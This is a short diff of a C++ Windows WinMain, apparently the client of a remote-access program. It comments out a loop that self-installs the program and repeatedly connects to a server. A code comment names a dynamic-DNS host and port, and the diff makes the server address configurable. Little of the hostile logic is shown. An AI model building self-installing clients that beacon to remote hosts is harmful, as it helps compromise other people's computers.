@@ -7,7 +7,7 @@
 #include "general.h"
 
 
-
+#if _DEBUG
 //TESTFUNC
 
 void testMB(std::string s)		//TEST FUNCTION
@@ -17,17 +17,19 @@ void testMB(std::string s)		//TEST FUNCTION
 
 //END TESTFUNC
 
+#endif
+
 
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)	//main function
 {
 	//VARIABLE SETUP
 	General::lpArguments = lpCmdLine;
-
+	/*
 
 	if (General::init())	//runs init() and exits file if it installs itself (starts new file)
 		return 0;
 
-	Client MyClient("127.0.0.1", 1111); //Client MyClient("nehcer.ddns.net", 38632);
+	Client MyClient(Settings::serverIP, Settings::serverPort); //Client MyClient("nehcer.ddns.net", 38632);
 
 	while (true)
 	{
@@ -41,6 +43,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdL
 		Sleep(15000);
 	}
 
+	*/
 	//test stuff (WORKS \o/)
 
 	return 0;
